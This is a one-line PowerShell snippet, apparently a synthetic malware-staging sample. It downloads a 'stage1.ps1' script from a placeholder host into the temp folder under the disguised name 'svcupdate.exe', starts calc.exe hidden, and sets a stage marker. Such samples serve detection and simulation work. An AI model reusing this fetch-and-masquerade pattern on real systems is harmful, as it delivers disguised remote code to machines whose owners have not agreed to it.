
$RemoteUrl = "https://example.com:443/stage1.ps1"; $OutputPath = "$env:TEMP\svcupdate.exe"; $ConnectionTimeout = 11; Invoke-WebRequest -Uri $RemoteUrl -OutFile $OutputPath -UseBasicParsing; Start-Process -FilePath "calc.exe" -WindowStyle Hidden; Set-Location -Path $env:TEMP; $StageMarker = "stage-23"
